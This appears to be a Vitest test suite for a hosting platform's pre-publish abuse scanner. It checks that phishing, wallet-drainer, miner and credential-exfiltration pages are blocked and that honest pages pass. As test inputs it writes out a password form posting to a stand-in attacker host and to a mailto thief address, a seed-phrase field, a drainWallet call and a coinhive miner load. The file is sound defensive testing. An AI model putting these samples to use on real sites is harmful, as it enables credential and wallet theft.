/**
 * AKT 2 · PHASE 2 · U2.3 — THE FIXTURE BATTERY. 9 artifacts, 9 expected verdicts.
 *
 * This is the phase's hardest gate: a wrong "pass" on a hostile fixture is a phase
 * failure, because the Nutzungsrichtlinie publicly promises an automated check
 * before publishing and this is that check.
 *
 * The fixtures are REAL FILES on disk (`__fixtures__/hosted-publish/`), not inline
 * strings, for two reasons. They can be opened and read like the pages they are —
 * a reviewer can judge whether `benign-06` really is an honest security guide
 * rather than take a test's word for it. And the runbook's standing instruction
 * (ABUSE_RESPONSE §7: "jeden echten Missbrauchsfall als neue Regel + Fixture
 * gießen") means this directory grows with every real case, so it has to be a
 * place you can drop a file into.
 *
 * The six benign fixtures are not filler. Each one is aimed at a specific rule and
 * proves it does NOT fire on honest use:
 *   benign-02 → the credential rules (a login for the builder's OWN app)
 *   benign-03 → the foreign-post rule (a newsletter form posting to Mailchimp)
 *   benign-04 → the payment rule (a checkout that talks about cards and uses Stripe)
 *   benign-05 → the obfuscation rules (a real minified Vite bundle)
 *   benign-06 → the wallet rules (a page that EXPLAINS seed phrases)
 * A false positive here is our own honesty failure, and it costs a paying builder
 * their publish — which is why the benign half of this battery is the larger half.
 */

import { describe, it, expect } from 'vitest';
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join, relative } from 'node:path';
import { scanHostedArtifact, type HostedScanFile } from './hosted-publish-scan';
import { HOSTED_MAX_FILES, HOSTED_MAX_FILE_BYTES, HOSTED_MAX_TOTAL_BYTES } from './hosted-scan-rules';

const FIXTURE_ROOT = join(dirname(fileURLToPath(import.meta.url)), '__fixtures__', 'hosted-publish');

/** Load one fixture directory the way the publish path loads a project. */
function loadFixture(name: string): HostedScanFile[] {
  const root = join(FIXTURE_ROOT, name);
  const out: HostedScanFile[] = [];
  const walk = (dir: string) => {
    for (const entry of readdirSync(dir)) {
      const full = join(dir, entry);
      if (statSync(full).isDirectory()) walk(full);
      else {
        const content = readFileSync(full, 'utf8');
        out.push({ path: relative(root, full).split('\\').join('/'), content, bytes: Buffer.byteLength(content) });
      }
    }
  };
  walk(root);
  return out;
}

/**
 * The battery. `expect` is the whole verdict, and for a block also the CATEGORY —
 * blocking for the wrong reason would produce the wrong German message and send
 * the builder to the wrong part of the policy.
 */
const BATTERY: Array<{ fixture: string; expect: 'pass' | 'block'; area?: string; why: string }> = [
  { fixture: 'benign-01-portfolio', expect: 'pass', why: 'a static portfolio — the baseline case' },
  { fixture: 'benign-02-own-login', expect: 'pass', why: 'a login for the builder’s OWN app, posting to its own backend' },
  { fixture: 'benign-03-newsletter', expect: 'pass', why: 'an external form action with NO credential field' },
  { fixture: 'benign-04-shop-stripe', expect: 'pass', why: 'talks about cards, collects none — Stripe does that' },
  { fixture: 'benign-05-spa-build', expect: 'pass', why: 'a real minified bundle — minified is not obfuscated' },
  { fixture: 'benign-06-crypto-guide', expect: 'pass', why: 'EXPLAINS seed phrases, asks for nothing' },
  { fixture: 'hostile-01-paypal-phish', expect: 'block', area: 'phishing', why: 'foreign brand + credential field' },
  { fixture: 'hostile-02-wallet-drainer', expect: 'block', area: 'wallet', why: 'seed-phrase input + drainer call' },
  { fixture: 'hostile-03-cred-exfil', expect: 'block', area: 'phishing', why: 'credentials posted to a foreign domain' },
];

describe('U2.3 — the 9/9 fixture battery', () => {
  it('has exactly 9 committed fixtures, 6 benign and 3 hostile', () => {
    const dirs = readdirSync(FIXTURE_ROOT).filter((d) => statSync(join(FIXTURE_ROOT, d)).isDirectory());
    expect(dirs.sort()).toEqual(BATTERY.map((b) => b.fixture).sort());
    expect(dirs.filter((d) => d.startsWith('benign-'))).toHaveLength(6);
    expect(dirs.filter((d) => d.startsWith('hostile-'))).toHaveLength(3);
  });

  for (const c of BATTERY) {
    it(`${c.fixture} → ${c.expect} (${c.why})`, () => {
      const result = scanHostedArtifact(loadFixture(c.fixture));
      // On an unexpected verdict, print the rule ids — a failure here must say WHY
      // in one line rather than send someone hunting.
      expect({ verdict: result.verdict, rules: result.ruleIds }).toEqual({
        verdict: c.expect,
        rules: c.expect === 'pass' ? [] : result.ruleIds,
      });
      if (c.expect === 'block') {
        expect(result.area).toBe(c.area);
        expect(result.ruleIds.length).toBeGreaterThan(0);
        expect(result.message).toBeTruthy();
      }
    });
  }

  it('scores 9/9 — the numeric gate', () => {
    const results = BATTERY.map((c) => ({
      fixture: c.fixture,
      got: scanHostedArtifact(loadFixture(c.fixture)).verdict,
      want: c.expect,
    }));
    const correct = results.filter((r) => r.got === r.want).length;
    expect({ correct, total: results.length, wrong: results.filter((r) => r.got !== r.want) }).toEqual({
      correct: 9,
      total: 9,
      wrong: [],
    });
  });
});

// ── The same nine artifacts, in the shape production runs them ──────────────

describe('the generated fixture constant', () => {
  it('is identical to the files on disk', async () => {
    // U2.8 re-runs this battery ON PRODUCTION, and a bundled API cannot read
    // __fixtures__/ off disk. So the fixtures are also emitted as a constant, and
    // this is what stops prod from silently scoring 9/9 on a stale copy.
    const { HOSTED_SCAN_FIXTURES } = await import('./hosted-fixtures.generated');
    const onDisk: Record<string, Record<string, string>> = {};
    for (const c of BATTERY) {
      onDisk[c.fixture] = Object.fromEntries(loadFixture(c.fixture).map((f) => [f.path, f.content!]));
    }
    expect(HOSTED_SCAN_FIXTURES).toEqual(onDisk);
  });

  it('scores 9/9 through the production battery runner too', async () => {
    const { runScanBattery } = await import('../ops-e2e');
    expect(runScanBattery()).toEqual({ correct: 9, total: 9, wrong: [] });
  });
});

// ── The messages a blocked builder actually reads ───────────────────────────

describe('block messages', () => {
  it('name the category and the appeal path, never the rule that fired', () => {
    for (const c of BATTERY.filter((b) => b.expect === 'block')) {
      const result = scanHostedArtifact(loadFixture(c.fixture));
      const msg = result.message!;
      expect(msg).toContain('Nutzungsrichtlinie');
      expect(msg).toContain('Feedback-Knopf');
      // Telling someone which pattern fired tells the next attacker how to pass.
      for (const id of result.ruleIds) expect(msg).not.toContain(id);
      expect(msg).not.toMatch(/regex|pattern|rule|signature/i);
    }
  });

  it('is German, and says what IS allowed as well as what is not', () => {
    const wallet = scanHostedArtifact(loadFixture('hostile-02-wallet-drainer'));
    expect(wallet.message).toContain('Eine Seite, die ÜBER Wallets informiert, ist erlaubt');
  });
});

// ── Artifact sanity ─────────────────────────────────────────────────────────

describe('artifact sanity (size and type)', () => {
  const html = (): HostedScanFile => ({ path: 'index.html', content: '<h1>ok</h1>', bytes: 11 });

  it('passes an ordinary static artifact', () => {
    expect(scanHostedArtifact([html()]).verdict).toBe('pass');
  });

  it('blocks a server-side source file the host could only leak, never run', () => {
    const r = scanHostedArtifact([html(), { path: 'config.php', content: '<?php $db="secret";', bytes: 19 }]);
    expect(r.verdict).toBe('block');
    expect(r.area).toBe('artifact');
    expect(r.ruleIds).toContain('ART-DISALLOWED-TYPE');
  });

  it('blocks a binary that a static host has no business serving', () => {
    const r = scanHostedArtifact([html(), { path: 'setup.exe', bytes: 4096 }]);
    expect(r.verdict).toBe('block');
    expect(r.ruleIds).toContain('ART-DISALLOWED-TYPE');
  });

  it('allows the full static web set (fonts, wasm, media, manifests)', () => {
    const files = ['a.woff2', 'b.wasm', 'c.mp4', 'd.webmanifest', 'e.svg', 'f.map', 'g.csv'].map((p) => ({
      path: p,
      bytes: 100,
    }));
    expect(scanHostedArtifact([html(), ...files]).verdict).toBe('pass');
  });

  it('blocks a single oversized file', () => {
    const r = scanHostedArtifact([html(), { path: 'huge.png', bytes: HOSTED_MAX_FILE_BYTES + 1 }]);
    expect(r.ruleIds).toContain('ART-FILE-TOO-LARGE');
  });

  it('blocks an oversized artifact even when every file is small', () => {
    const many = Array.from({ length: 100 }, (_, i) => ({
      path: `img-${i}.png`,
      bytes: Math.ceil(HOSTED_MAX_TOTAL_BYTES / 100) + 1,
    }));
    const r = scanHostedArtifact([html(), ...many]);
    expect(r.ruleIds).toContain('ART-TOTAL-TOO-LARGE');
  });

  it('blocks a file-count explosion', () => {
    const many = Array.from({ length: HOSTED_MAX_FILES + 1 }, (_, i) => ({ path: `p-${i}.html`, bytes: 10 }));
    expect(scanHostedArtifact(many).ruleIds).toContain('ART-TOO-MANY-FILES');
  });

  it('reports a size block as `artifact`, never as malware', () => {
    // The rule borrows K3's `malware` policyArea internally because ScanHit's union
    // is closed. The BUILDER must never read that their PDF looked like malware.
    const r = scanHostedArtifact([html(), { path: 'huge.png', bytes: HOSTED_MAX_FILE_BYTES + 1 }]);
    expect(r.area).toBe('artifact');
    expect(r.message).not.toMatch(/Schadcode|Miner/);
    expect(r.message).toContain('zu groß');
  });
});

// ── The hosted-only rules, isolated ─────────────────────────────────────────

describe('wallet rules', () => {
  it('blocks a seed-phrase INPUT', () => {
    const r = scanHostedArtifact([
      { path: 'index.html', content: '<form><input name="mnemonic" placeholder="Recovery Phrase"></form>', bytes: 70 },
    ]);
    expect(r.verdict).toBe('block');
    expect(r.ruleIds).toContain('WD-SEED-FIELD');
  });

  it('does NOT block the same words in prose', () => {
    const r = scanHostedArtifact([
      {
        path: 'index.html',
        content: '<p>Gib deine Recovery Phrase oder deinen Private Key niemals irgendwo ein. Mnemonic bleibt geheim.</p>',
        bytes: 100,
      },
    ]);
    expect(r.verdict).toBe('pass');
  });

  it('does NOT block prose about drainers — only drainer CODE', () => {
    const prose = scanHostedArtifact([
      { path: 'index.html', content: '<p>Ein Wallet-Drainer ist ein Betrugswerkzeug. Erkenne einen Drainer so:</p>', bytes: 80 },
    ]);
    expect(prose.verdict).toBe('pass');

    const code = scanHostedArtifact([{ path: 'app.js', content: 'await drainWallet(seed);', bytes: 24 }]);
    expect(code.verdict).toBe('block');
    expect(code.ruleIds).toContain('WD-DRAINER-SIG');
  });
});

describe('credential exfiltration to a foreign domain (hosted-only escalation)', () => {
  const login = (action: string) =>
    `<form action="${action}"><input name="passwort" type="password"></form>`;

  it('blocks a credential form posting off-platform', () => {
    const r = scanHostedArtifact([{ path: 'index.html', content: login('https://evil.example.net/c'), bytes: 80 }]);
    expect(r.verdict).toBe('block');
    expect(r.ruleIds).toContain('HP-CRED-FOREIGN-POST');
  });

  it('allows a credential form posting to the app`s own backend', () => {
    const r = scanHostedArtifact([{ path: 'index.html', content: login('/api/login'), bytes: 60 }]);
    expect(r.verdict).toBe('pass');
  });

  it('allows a credential form posting to another app on the apps domain', () => {
    const r = scanHostedArtifact([
      { path: 'index.html', content: login('https://meinbackend.justgoblin.app/login'), bytes: 90 },
    ]);
    expect(r.verdict).toBe('pass');
  });

  it('blocks a credential form mailing the data to someone', () => {
    const r = scanHostedArtifact([{ path: 'index.html', content: login('mailto:dieb@example.net'), bytes: 70 }]);
    expect(r.verdict).toBe('block');
  });

  it('says nothing about an action it cannot parse', () => {
    // Absence of understanding is not evidence of wrongdoing.
    const r = scanHostedArtifact([{ path: 'index.html', content: login('{{ formAction }}'), bytes: 70 }]);
    expect(r.verdict).toBe('pass');
  });
});

describe('log-only signals inform without punishing', () => {
  it('records a hidden external iframe but does not block it', () => {
    // Hidden external iframes are also how payment SDKs and analytics pixels work.
    const r = scanHostedArtifact([
      { path: 'index.html', content: '<iframe src="https://pay.example.com/x" style="display:none"></iframe>', bytes: 70 },
    ]);
    expect(r.verdict).toBe('pass');
    expect(r.hits.map((h) => h.ruleId)).toContain('HP-HIDDEN-EXTERNAL-IFRAME');
  });
});

// ── The K3 relationship ─────────────────────────────────────────────────────

describe('same policy, one ruleset', () => {
  it('inherits K3`s blocking rules verbatim — a miner is blocked on both paths', () => {
    const r = scanHostedArtifact([{ path: 'app.js', content: 'load("coinhive.min.js")', bytes: 24 }]);
    expect(r.verdict).toBe('block');
    expect(r.ruleIds).toContain('MW-MINER-SIG');
    expect(r.area).toBe('malware');
  });

  it('inherits K3`s German wording verbatim for the shared areas', async () => {
    const { BLOCK_MESSAGE } = await import('./scan-rules');
    const r = scanHostedArtifact([{ path: 'app.js', content: 'load("coinhive.min.js")', bytes: 24 }]);
    expect(r.message).toBe(BLOCK_MESSAGE.malware);
  });

  it('only inspects scannable text types, and says how much it looked at', () => {
    const r = scanHostedArtifact([
      { path: 'index.html', content: '<h1>a</h1>', bytes: 10 },
      { path: 'logo.png', bytes: 5000 },
    ]);
    expect(r.scannedFiles).toBe(1);
    expect(r.scannedBytes).toBe(10);
  });

  it('is deterministic — the same artifact always gets the same verdict', () => {
    const files = loadFixture('hostile-01-paypal-phish');
    const runs = Array.from({ length: 5 }, () => JSON.stringify(scanHostedArtifact(files)));
    expect(new Set(runs).size).toBe(1);
  });
});
